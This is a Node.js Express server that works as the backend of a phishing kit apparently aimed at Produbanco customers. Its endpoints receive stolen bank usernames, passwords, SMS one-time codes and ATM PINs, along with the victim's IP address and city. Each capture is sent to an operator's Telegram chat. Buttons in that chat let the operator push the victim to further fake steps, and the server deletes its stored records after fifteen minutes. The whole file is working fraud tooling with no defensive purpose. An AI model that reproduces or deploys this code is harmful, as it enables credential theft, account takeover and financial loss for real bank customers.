const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const FormData = require('form-data');
const https = require('https');

require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const agent = new https.Agent({ family: 4 });

const CLIENTES_DIR = './clientes';
if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}


function obtenerIP(req) {
  const forwarded = req.headers['x-forwarded-for'];
  return (forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress) || 'desconocida';
}


async function obtenerCiudad(ip) {
  try {
    const { data } = await axios.get(`https://ipwhois.app/json/${ip}`);
    return data.city || 'desconocida';
  } catch {
    return 'desconocida';
  }
}


setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.mtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}





app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑SMS", callback_data: `cel-dina:${txid}` },
        { text: "🏧PYN", callback_data: `cajero:${txid}` },
        { text: "🔐C0RR30", callback_data: `patron:${txid}` }
      ],
      [
        { text: "❌LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});


app.post('/enviar2', async (req, res) => {
  const { usar, clavv, txid } = req.body;
  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 C0RR30: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = { status: "esperando", usar, clavv, preguntas: [], ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑SMS", callback_data: `cel-dina:${txid}` },
        { text: "🏧PYN", callback_data: `cajero:${txid}` },
        { text: "🔐C0RR30", callback_data: `patron:${txid}` }
      ],
      [
        { text: "❌LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});


app.post('/enviar3', async (req, res) => {
  const { usar, clavv,  pnn1, pnn2, pnn3, pnn4, pnn5, pnn6, txid, dinamic } = req.body;
  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🔑🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 0TP: <code>${pnn1}${pnn2}${pnn3}${pnn4}${pnn5}${pnn6}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑SMS", callback_data: `cel-dina:${txid}` },
        { text: "🏧PYN", callback_data: `cajero:${txid}` },
        { text: "🔐C0RR30", callback_data: `patron:${txid}` }
      ],
      [
        { text: "❌LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});


app.post('/enviar4', async (req, res) => {
  const { usar, clavv, txid, pnn1, pnn2, pnn3, pnn4 } = req.body;
  const ip = obtenerIP(req);
  const ciudad = await obtenerCiudad(ip);

  const mensaje = `
🔑🟢PRODUB4NC0🟢
🆔 ID: <code>${txid}</code>

📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>

🔑 4TM: <code>${pnn1}${pnn2}${pnn3}${pnn4}</code>

🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const cliente = { status: "esperando", usar, clavv, ip, ciudad };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑SMS", callback_data: `cel-dina:${txid}` },
        { text: "🏧PYN", callback_data: `cajero:${txid}` },
        { text: "🔐C0RR30", callback_data: `patron:${txid}` }
      ],
      [
        { text: "❌LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: CHAT_ID, text: mensaje, parse_mode: 'HTML', reply_markup: keyboard })
  });

  res.sendStatus(200);
});


app.post('/webhook', async (req, res) => {
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };
    cliente.status = accion;
    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ callback_query_id: callback.id, text: `Has seleccionado: ${accion}` })
    });

    return res.sendStatus(200);
  }

  res.sendStatus(200);
});


app.get('/sendStatus.php', (req, res) => {
  const txid = req.query.txid;
  const cliente = cargarCliente(txid) || { status: 'esperando', preguntas: [] };
  res.json({ status: cliente.status, preguntas: cliente.preguntas });
});


app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en Render puerto ${PORT}`));
